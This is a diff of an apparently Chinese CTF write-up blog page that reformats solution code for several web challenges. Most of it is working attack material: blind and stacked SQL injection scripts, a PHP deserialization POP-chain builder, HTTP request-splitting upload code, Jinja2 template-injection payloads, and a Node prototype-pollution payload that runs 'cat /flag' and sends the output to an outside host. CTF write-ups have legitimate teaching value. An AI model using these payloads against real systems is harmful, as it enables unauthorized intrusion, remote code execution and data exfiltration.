@@ -389,41 +389,162 @@
 <a id="more"></a>
 
 <h2 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h2><p>本题漏洞比较明显，PDO 支持堆叠注入，然后用十六进制绕过 check。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://4efaa4d7badc406b9b50ecab0c36eaeb13b1c0c4b1b14e55.changame.ichunqiu.com/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">chset = string.printable</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbname = pdotest</span></span><br><span class="line"><span class="comment"># tbname = table1</span></span><br><span class="line"><span class="comment"># clname = balabala,eihey,fllllll4g,bbb</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">	l = <span class="number">0</span></span><br><span class="line">	r = <span class="number">127</span></span><br><span class="line">	m = (l+r)//<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">while</span> l&lt;r:</span><br><span class="line">		<span class="comment"># print("[*] try: &#123;&#125;".format(chr(m)))</span></span><br><span class="line">		payload = <span class="string">"select if(ascii(mid((select fllllll4g from table1),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),1)"</span>.format(index,m)</span><br><span class="line">		payload = binascii.b2a_hex(payload.encode()).decode()</span><br><span class="line">		payload = <span class="string">"1"</span>+urllib.parse.unquote(<span class="string">"%df"</span>)+<span class="string">"';set @a=0x&#123;&#125;;prepare cmd from @a;execute cmd;"</span>.format(payload)</span><br><span class="line"></span><br><span class="line">		paramsGet = &#123;<span class="string">"id"</span>:payload&#125;</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			res = session.get(url, params=paramsGet, timeout=<span class="number">2</span>)</span><br><span class="line">			r = m</span><br><span class="line">			m = (l+r)//<span class="number">2</span></span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			l = m + <span class="number">1</span></span><br><span class="line">			m = (l+r)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">	flag += chr(m)</span><br><span class="line">    print(<span class="string">"[+] flag: &#123;&#125;"</span>.format(flag))</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+import string
+import binascii
+import urllib.parse
+import threading
 
+url = &quot;http://4efaa4d7badc406b9b50ecab0c36eaeb13b1c0c4b1b14e55.changame.ichunqiu.com/&quot;
+flag = &quot;&quot;
+index = 1
+chset = string.printable
+
+session = requests.Session()
+
+# dbname = pdotest
+# tbname = table1
+# clname = balabala,eihey,fllllll4g,bbb
+
+flag = &#39;&#39;
+index = 1
+
+while True:
+
+    l = 0
+    r = 127
+    m = (l+r)//2
+
+    while l&lt;r:
+        # print(&quot;[*] try: {}&quot;.format(chr(m)))
+        payload = &quot;select if(ascii(mid((select fllllll4g from table1),{},1))&gt;{},sleep(3),1)&quot;.format(index,m)
+        payload = binascii.b2a_hex(payload.encode()).decode()
+        payload = &quot;1&quot;+urllib.parse.unquote(&quot;%df&quot;)+&quot;&#39;;set @a=0x{};prepare cmd from @a;execute cmd;&quot;.format(payload)
+
+        paramsGet = {&quot;id&quot;:payload}
+        try:
+            res = session.get(url, params=paramsGet, timeout=2)
+            r = m
+            m = (l+r)//2
+        except Exception as e:
+            l = m + 1
+            m = (l+r)//2
+
+    flag += chr(m)
+    print(&quot;[+] flag: {}&quot;.format(flag))
+    index += 1</code></pre>
 <h2 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h2><p>改自 2019 qwb 随便注，过滤了 set、prepare 等，随便搜搜发现是 2019 fudanctf 原题</p>
 <p><a href="https://www.4hou.com/posts/mM60" target="_blank" rel="noopener">https://www.4hou.com/posts/mM60</a></p>
 <p>采用的是 mysql handler 的新特性 handler</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dev.mysql.com/doc/refman/8.0/en/handler.html</span><br></pre></td></tr></table></figure>
-
+<pre><code>https://dev.mysql.com/doc/refman/8.0/en/handler.html</code></pre><p>payload</p>
+<pre><code>1. 获取表名
+;show tables;#
+2. 读表
+&#39;;handler FlagHere open; handler FlagHere read first;</code></pre><h2 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h2><p>考察 toUpperCase() 漏洞和原型链污染，这个原型链污染十分的明显，直接看到未定义变量 outputFunctionName，看到了 merge 函数的触发点</p>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 获取表名</span><br><span class="line">;show tables;#</span><br><span class="line">2. 读表</span><br><span class="line">&apos;;handler FlagHere open; handler FlagHere read first;</span><br></pre></td></tr></table></figure>
-
-<h2 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h2><p>考察 toUpperCase() 漏洞和原型链污染，这个原型链污染十分的明显，直接看到未定义变量 outputFunctionName，看到了 merge 函数的触发点</p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 注册账号</span><br><span class="line">admın:123</span><br><span class="line">2. 原型污染 application/json</span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: &quot;test\nvar require = global.require || global.process.mainModule.constructor._load;var result = require(&apos;child_process&apos;).execSync(&apos;ping http://xxxxx/$(cat /flag)&apos;);var req = require(&apos;http&apos;).request(`http://*.*.*.*/?$&#123;result&#125;`);req.end();\n//&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>这个看了官方 payload 表示无法理解，当时直接随便穿个马就 getshell …大概是过滤没写好吧</p>
+<pre><code>1. 注册账号
+admın:123
+2. 原型污染 application/json
+{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;: &quot;test\nvar require = global.require || global.process.mainModule.constructor._load;var result = require(&#39;child_process&#39;).execSync(&#39;ping http://xxxxx/$(cat /flag)&#39;);var req = require(&#39;http&#39;).request(`http://*.*.*.*/?${result}`);req.end();\n//&quot;}}</code></pre><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>这个看了官方 payload 表示无法理解，当时直接随便穿个马就 getshell …大概是过滤没写好吧</p>
 <h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>反序列化 + piapiapia 原题</p>
 <p>pop 链比较明显，<code>UpdateHelper</code> 的 <code>__destruct()</code> =&gt; <code>User</code> 的 <code>__toString()</code> =&gt;<code>Info</code>的<code>__call()</code>，即可任意执行 sql 语句，然后根据下面的 safe 函数溢出 payload 构成新的序列化语句</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">function safe($parm){
+    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);
+    return str_replace($array,&#39;hacker&#39;,$parm);
+}</code></pre>
+<pre><code class="php">public function getNewInfo(){
+        $age=$_POST[&#39;age&#39;];
+        $nickname=$_POST[&#39;nickname&#39;];
+        return safe(serialize(new Info($age,$nickname)));
+    }</code></pre>
 <p>参考了月亮大哥的 payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="string">'select id,password from user where username=?'</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname = <span class="string">"a"</span>;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token=<span class="string">"admin"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$i = <span class="keyword">new</span> Info();</span><br><span class="line">$i-&gt;CtrlCase = $o;</span><br><span class="line">$u = <span class="keyword">new</span> User();</span><br><span class="line">$u-&gt;nickname = $i;</span><br><span class="line">$h = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$h-&gt;sql = $u;</span><br><span class="line"></span><br><span class="line">$f = <span class="keyword">new</span> Info();</span><br><span class="line">$f-&gt;CtrlCase = $h;</span><br><span class="line">$s = serialize($f);</span><br><span class="line">$s = substr($s,<span class="number">47</span>);</span><br><span class="line">$len = strlen($s);</span><br><span class="line">$res = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($dd=<span class="number">0</span>;$dd&lt;$len;$dd++)&#123;</span><br><span class="line">    $res.=<span class="string">"union"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$res.=$s;</span><br><span class="line"><span class="keyword">echo</span> urlencode($res);</span><br><span class="line"></span><br><span class="line"><span class="comment">// POST:</span></span><br><span class="line"><span class="comment">// age=&amp;nickname=上面</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
 
+class User
+{
+    public $id;
+    public $age=&#39;select id,password from user where username=?&#39;;
+    public $nickname;
+}
+class Info{
+    public $age;
+    public $nickname = &quot;a&quot;;
+    public $CtrlCase; 
+}
+Class UpdateHelper{
+    public $id;
+    public $newinfo;
+    public $sql;
+}
+class dbCtrl
+{
+    public $hostname=&quot;127.0.0.1&quot;;
+    public $dbuser=&quot;noob123&quot;;
+    public $dbpass=&quot;noob123&quot;;
+    public $database=&quot;noob123&quot;;
+    public $name=&#39;admin&#39;;
+    public $password=2;
+    public $mysqli;
+    public $token=&quot;admin&quot;;
+}
+$o = new dbCtrl();
+$i = new Info();
+$i-&gt;CtrlCase = $o;
+$u = new User();
+$u-&gt;nickname = $i;
+$h = new UpdateHelper();
+$h-&gt;sql = $u;
+
+$f = new Info();
+$f-&gt;CtrlCase = $h;
+$s = serialize($f);
+$s = substr($s,47);
+$len = strlen($s);
+$res = &quot;&quot;;
+
+for($dd=0;$dd&lt;$len;$dd++){
+    $res.=&quot;union&quot;;
+}
+$res.=$s;
+echo urlencode($res);
+
+// POST:
+// age=&amp;nickname=上面</code></pre>
 <h2 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h2><p>这道题当时没完成，结束后才发现当时搭环境没有搭完整…</p>
 <p>也是参考了 Nullcon HackIM 2020 - split second 原题，但是过滤难度下降了，payload 可以直接拿来用</p>
 <p>赛后就在本地复现了上传</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''' HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------20539204871043521200876952878</span></span><br><span class="line"><span class="string">Content-Length: 222</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------20539204871043521200876952878</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="kk.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hack</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------20539204871043521200876952878--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">x: '''</span> </span><br><span class="line"></span><br><span class="line">payload = payload.replace(<span class="string">"\n"</span>,<span class="string">"\r\n"</span>)</span><br><span class="line">payload = <span class="string">''</span>.join(chr(int(<span class="string">'0xff'</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line"></span><br><span class="line">proxy = &#123; <span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span> &#125;</span><br><span class="line">requests.get(<span class="string">"http://127.0.0.1:8081/core"</span>, params=&#123;<span class="string">'q'</span>:payload&#125;)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import urllib.parse
+import requests
 
+payload = &#39;&#39;&#39; HTTP/1.1
+
+POST /file_upload HTTP/1.1
+Host: x
+Content-Type: multipart/form-data; boundary=---------------------------20539204871043521200876952878
+Content-Length: 222
+Connection: keep-alive
+
+-----------------------------20539204871043521200876952878
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;kk.pug&quot;
+Content-Type: ../template
+
+hack
+
+-----------------------------20539204871043521200876952878--
+
+GET /flag HTTP/1.1
+x: &#39;&#39;&#39; 
+
+payload = payload.replace(&quot;\n&quot;,&quot;\r\n&quot;)
+payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
+
+proxy = { &quot;http&quot;:&quot;127.0.0.1:8080&quot; }
+requests.get(&quot;http://127.0.0.1:8081/core&quot;, params={&#39;q&#39;:payload})
+</code></pre>
 <p>把 Nullcon HackIM 2020 - split second的 wp 直接拿过来过一下请求包就可以了</p>
 <p><a href="https://blog.rwx.kr/nullcon-hackim-2020-split-second/" target="_blank" rel="noopener">https://blog.rwx.kr/nullcon-hackim-2020-split-second/</a></p>
 <p>最后上传以下代码就可以执行命令了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-global.process.mainModule.require(&apos;child_process&apos;).execSync(&apos;evalcmd&apos;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h2><p>参考 <a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">https://paper.seebug.org/1114/</a> tp6 的任意写文件漏洞</p>
+<pre><code>-global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;evalcmd&#39;)</code></pre><h2 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h2><p>参考 <a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">https://paper.seebug.org/1114/</a> tp6 的任意写文件漏洞</p>
 <p>写个小马后需要绕过 disable_functions</p>
 <p>利用别人的工具 <a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a> 成功 getshell</p>
 <h2 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h2><p>题目考察的是 模板注入 + PIN，但是当时按着 PIN 教程复现不了，好像当时是机器 id 取错了，见官方 wp</p>
@@ -431,19 +552,86 @@
 <p>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同，对于docker机则读取/proc/self/cgroup。</p>
 </blockquote>
 <p>然后当时自己是直接执行命令 getflag 的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#conding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ec_url = <span class="string">'http://123.57.212.112:10001/'</span></span><br><span class="line">dc_url = ec_url + <span class="string">'decode'</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"&#123;% if [].__class__.__base__.__subclasses__()[127].__init__.__globals__['sys'+'tem']('ls / &gt; /tmp/test1') %&#125;2&#123;% endif %&#125;"</span></span><br><span class="line">payload = <span class="string">"&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open"</span></span><br><span class="line">payload += <span class="string">"('this_is_the_fl'+'ag.txt', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;"</span></span><br><span class="line"></span><br><span class="line">r1 = requests.post(url=ec_url,data=&#123;<span class="string">'text'</span>:payload&#125;)</span><br><span class="line"><span class="comment"># print(r1.text)</span></span><br><span class="line">b64 = re.findall(<span class="string">r"结果  :(.+)"</span>,r1.text)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="comment"># print(b64)</span></span><br><span class="line"></span><br><span class="line">r2 = requests.post(url=dc_url,data=&#123;<span class="string">'text'</span>:b64&#125;)</span><br><span class="line">print(r2.text)</span><br><span class="line">print(<span class="string">"============================="</span>)</span><br><span class="line">result = re.findall(<span class="string">r"times;&lt;/button&gt;([\d\D]*)&lt;!DOCTYPE html&gt;"</span>,r2.text)[<span class="number">0</span>].strip()</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#conding:utf-8
+import requests
+import re
+import base64
 
+ec_url = &#39;http://123.57.212.112:10001/&#39;
+dc_url = ec_url + &#39;decode&#39;
+proxy = {&quot;http&quot;:&quot;127.0.0.1:8080&quot;}
+
+payload = &quot;{% if [].__class__.__base__.__subclasses__()[127].__init__.__globals__['sys'+'tem']('ls / > /tmp/test1') %}2{% endif %}"
+payload = "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open"
+payload += "('this_is_the_fl'+'ag.txt', 'r').read() }}{% endif %}{% endfor %}&quot;
+
+r1 = requests.post(url=ec_url,data={&#39;text&#39;:payload})
+# print(r1.text)
+b64 = re.findall(r&quot;结果  :(.+)&quot;,r1.text)[0].strip()
+# print(b64)
+
+r2 = requests.post(url=dc_url,data={&#39;text&#39;:b64})
+print(r2.text)
+print(&quot;=============================&quot;)
+result = re.findall(r&quot;times;&lt;/button&gt;([\d\D]*)&lt;!DOCTYPE html&gt;&quot;,r2.text)[0].strip()
+print(result)</code></pre>
 <h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>被这个 fl4g 坑了好久，一直在考虑暴列明，谁知道可以直接读</p>
 <p>payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">flag = <span class="string">'f'</span></span><br><span class="line">index = <span class="number">2</span></span><br><span class="line">chset = string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span> ch <span class="keyword">in</span> chset:</span><br><span class="line">		print(<span class="string">"[*] now ch: &#123;&#125;"</span>.format(ch))</span><br><span class="line">		paramsGet = &#123;<span class="string">"id"</span>:<span class="string">"if((ascii(mid(fl4g,&#123;&#125;,1)))in(&#123;&#125;),sleep(3),1)"</span>.format(index,ord(ch))&#125;</span><br><span class="line">		r = <span class="string">''</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			r = session.get(<span class="string">"http://8539506905a2494b837a7dfc662635f6d7f0286ceecf477f.changame.ichunqiu.com/"</span>, params=paramsGet, timeout=<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			flag += ch</span><br><span class="line">			index += <span class="number">1</span></span><br><span class="line">			print(<span class="string">"[+] flag: &#123;&#125;"</span>.format(flag))</span><br><span class="line">			<span class="keyword">if</span> ch==<span class="string">'&#125;'</span>:</span><br><span class="line">				exit()</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+import string
 
+session = requests.Session()
+flag = &#39;f&#39;
+index = 2
+chset = string.printable
+
+while True:
+    for ch in chset:
+        print(&quot;[*] now ch: {}&quot;.format(ch))
+        paramsGet = {&quot;id&quot;:&quot;if((ascii(mid(fl4g,{},1)))in({}),sleep(3),1)&quot;.format(index,ord(ch))}
+        r = &#39;&#39;
+        try:
+            r = session.get(&quot;http://8539506905a2494b837a7dfc662635f6d7f0286ceecf477f.changame.ichunqiu.com/&quot;, params=paramsGet, timeout=2)
+        except Exception as e:
+            flag += ch
+            index += 1
+            print(&quot;[+] flag: {}&quot;.format(flag))
+            if ch==&#39;}&#39;:
+                exit()
+            break</code></pre>
 <h2 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h2><p>注册登陆后显示名字，盲猜二次注入，直接贴 payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or updatexml(1,concat(0x7e,(select flaaag from flag)),0) or &apos;</span><br></pre></td></tr></table></figure>
-
-<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>搜了很久找到了 Sim1e 师傅的笔记，看到了他的无列名注入 <a href="https://www.smi1e.top/sql注入笔记/" target="_blank" rel="noopener">https://www.smi1e.top/sql注入笔记/</a></p>
+<pre><code>&#39; or updatexml(1,concat(0x7e,(select flaaag from flag)),0) or &#39;</code></pre><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>搜了很久找到了 Sim1e 师傅的笔记，看到了他的无列名注入 <a href="https://www.smi1e.top/sql注入笔记/" target="_blank" rel="noopener">https://www.smi1e.top/sql注入笔记/</a></p>
 <p>当时直接使用字符串比较会发生奇妙的错误，需要转成十六进制</p>
